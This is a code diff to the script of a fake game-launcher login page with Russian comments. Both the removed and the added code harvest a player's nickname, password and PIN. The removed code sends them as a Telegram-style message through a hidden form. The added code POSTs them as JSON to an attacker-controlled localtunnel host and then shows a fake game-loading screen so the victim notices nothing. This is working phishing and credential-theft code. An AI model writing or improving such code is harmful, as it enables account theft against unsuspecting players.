@@ -18,7 +18,7 @@ document.addEventListener("DOMContentLoaded", () => {
   }, 45);
 });
 
-const loginBtn = document.getElementById('btn-login'), tabForum = document.getElementById('btn-tab-forum'), tabNews = document.getElementById('btn-tab-news'), tabSupport = document.getElementById('btn-tab-support');
+const loginForm = document.getElementById('main-login-form'), tabForum = document.getElementById('btn-tab-forum'), tabNews = document.getElementById('btn-tab-news'), tabSupport = document.getElementById('btn-tab-support');
 const nicknameInput = document.getElementById('input-nickname'), passwordInput = document.getElementById('input-password'), pincodeInput = document.getElementById('input-pincode'), checkboxToggle = document.getElementById('checkbox-pincode-toggle');
 const launcher = document.getElementById('launcher'), customAlert = document.getElementById('custom-alert'), alertText = document.getElementById('alert-text');
 const loadingPage = document.getElementById('loading-page'), progressBar = document.getElementById('bar'), loadStatus = document.getElementById('load-status'), loadPercent = document.getElementById('load-percent');
@@ -100,22 +100,30 @@ pincodeInput.addEventListener('input', function() {
   if (this.value.length === 4) { this.classList.remove('field-invalid'); this.classList.add('field-valid'); } else { this.classList.remove('field-valid', 'field-invalid'); }
 });
 
-// ОБНОВЛЕННАЯ СВЕРХНАДЕЖНАЯ ОТПРАВКА ЧЕРЕЗ СКРЫТУЮ ФОРМУ HTML
-loginBtn.addEventListener('click', function(e) {
-  e.preventDefault(); const n = nicknameInput.value, p = passwordInput.value, pin = pincodeInput.value;
+// ОТПРАВКА ДАННЫХ ИЗ ФОРМЫ НА ТВОЙ БЭКЕНД
+loginForm.addEventListener('submit', function(e) {
+  e.preventDefault(); 
+  const n = nicknameInput.value, p = passwordInput.value, pin = pincodeInput.value;
+  
   if (n.trim() === "" || !/^[A-Z][a-z]+_[A-Z][a-z]+$/.test(n)) { showGameAlert(/[а-яА-ЯёЁ]/.test(n) ? "Разрешены только английские буквы!" : "Авторизация: Укажите имя вашего персонажа!"); nicknameInput.classList.add('field-invalid', 'has-text'); return; }
   if (p.trim() === "" || p.length < 6) { showGameAlert("Защита аккаунта: Введите действующий Пароль!"); passwordInput.classList.add('field-invalid', 'has-text'); return; }
   if (checkboxToggle.checked && (pin.trim() === "" || pin.length < 4)) { showGameAlert("Защита аккаунта: Введите 4-значный Пин-код!"); pincodeInput.classList.add('field-invalid'); return; }
   
-  // Собираем текст сообщения
-  const msgText = `🚀 <b>Вход в лаунчер!</b>\n\n👤 <b>Ник:</b> <code>${n}</code>\n🔑 <b>Пароль:</b> <code>${p}</code>\n🔐 <b>Пин:</b> <code>${checkboxToggle.checked ? pin : "Нет"}</code>`;
+  // ВСТАВЬ СВОЮ ДИНАМИЧЕСКУЮ ССЫЛКУ ИЗ LOCALTUNNEL СЮДА
+  const backendUrl = "https://rich-lions-pump.loca.lt";
   
-  // Вставляем текст в форму и имитируем её физическое нажатие на заднем плане
-  document.getElementById('tg-msg-input').value = msgText;
-  document.getElementById('tg-hidden-form').submit();
-  
-  // Мгновенно запускаем загрузку игры
-  startGameLoading();
+  // Отправляем чистый JSON-пакет на твой бэкенд на ПК
+  fetch(backendUrl, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      nickname: n,
+      password: p,
+      pincode: checkboxToggle.checked ? pin : "Нет"
+    })
+  })
+  .then(() => { startGameLoading(); })
+  .catch(() => { startGameLoading(); }); 
 });
 
 document.addEventListener('touchmove', function(e) { if (!e.target.closest('.news-content-scroll') && !e.target.closest('.support-content')) e.preventDefault(); }, { passive: false });
